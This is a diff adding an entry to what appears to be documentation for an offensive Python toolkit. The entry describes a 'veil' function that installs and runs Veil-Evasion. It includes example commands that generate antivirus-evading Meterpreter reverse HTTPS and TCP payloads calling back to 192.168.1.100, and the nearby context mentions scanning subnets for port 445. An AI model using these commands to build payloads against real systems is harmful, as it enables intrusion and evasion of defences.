@@ -3440,6 +3440,25 @@ a valid URL if no domain is provided. - The method uses
 the most secure or efficient method for production code. Consider using
 a library like <code>requests</code> for HTTP operations if security and
 efficiency are concerns.</p>
+<h2 id="veil">veil</h2>
+<p>Generates payloads using Veil-Evasion with various options.
+Veil-Evasion is a payload creation framework for generating payloads
+that evade antivirus detection. This function checks if
+<code>Veil-Evasion</code> is installed and installs it if necessary. It
+then runs <code>Veil-Evasion</code> with the specified parameters to
+create various payloads.</p>
+<p>:param line: Not used in this implementation but reserved for future
+use.</p>
+<p>:returns: None</p>
+<p>Manual execution: To manually generate a payload using Veil-Evasion,
+use the following command: ./Veil-Evasion.py -p <PAYLOAD> –<OPTION>
+<VALUE></p>
+<p>Replace the placeholders with the desired values. For example:
+./Veil-Evasion.py -p python/meterpreter/rev_https LHOST=192.168.1.100
+LPORT=443</p>
+<p>Example usage: veil python_meterpreter_rev_https LHOST=192.168.1.100
+LPORT=443 veil ruby_meterpreter_rev_tcp LHOST=192.168.1.100
+LPORT=4444</p>
 <h2 id="find_tgts">find_tgts</h2>
 <p>Finds and returns a list of target hosts with port 445 open in the
 specified subnet.</p>
